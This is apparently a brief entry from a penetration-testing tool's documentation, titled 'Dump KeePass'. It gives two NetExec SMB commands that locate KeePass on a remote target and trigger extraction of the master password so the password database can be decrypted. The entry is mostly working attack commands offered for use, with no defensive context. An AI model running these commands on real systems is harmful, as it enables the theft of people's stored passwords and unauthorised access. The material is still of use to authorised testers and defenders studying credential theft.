# Dump KeePass

You can check if keepass is installed on the target computer and then steal the master password and decrypt the database !

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M keepass_discover
nxc smb $TARGET -u $USER -p $PASSWORD -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```
